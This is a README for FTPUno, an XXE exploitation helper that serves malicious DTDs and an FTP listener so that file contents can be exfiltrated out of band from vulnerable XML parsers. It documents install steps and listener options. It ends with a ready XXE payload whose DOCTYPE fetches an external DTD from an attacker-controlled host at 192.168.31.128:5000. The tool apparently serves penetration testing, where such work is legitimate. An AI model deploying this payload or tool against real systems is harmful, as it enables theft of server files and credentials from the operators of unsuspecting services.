# FTPUno
A XXE exploitation helper tool to assist in XXE out of band exfiltration using FTP over a single egress port

## Requirements
The following python dependancies are required:
```python
twisted
```

## Installation
The script and dependancies can be installed using the following command:

```python
pip3 install -r ./requirements.txt
```

## Usage
The following options are available as arguments:

```
--outfile
    Path to the target output file
                        
--httpsport
    HTTPS Port to listen on (default 8443)

-u
--uno
    Global port to listen on (default 5000)

-wd
--dtddir
    Folder to server DTD(s) from (default "./")
                        
-fd
--ftpdir
    Folder to server FTP from (default "./")
                        
--ftptimeout
    FTP timeout (default 3s)
                        
--cert_file
    HTTPs public cert file
                        
--key_file
    HTTPs private key file                        
```

#### XXE payload
To trigger the external DTD lookup using a payload similiar to below:
```xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE testingxxe [<!ENTITY % remote SYSTEM "http://192.168.31.128:5000/xxe_ftp.dtd" > %remote; ]>
```

## Todo
The following things are todo:
* Further work on File Listing behaviour
* Support for FTP GET command
* Support for EPSV command
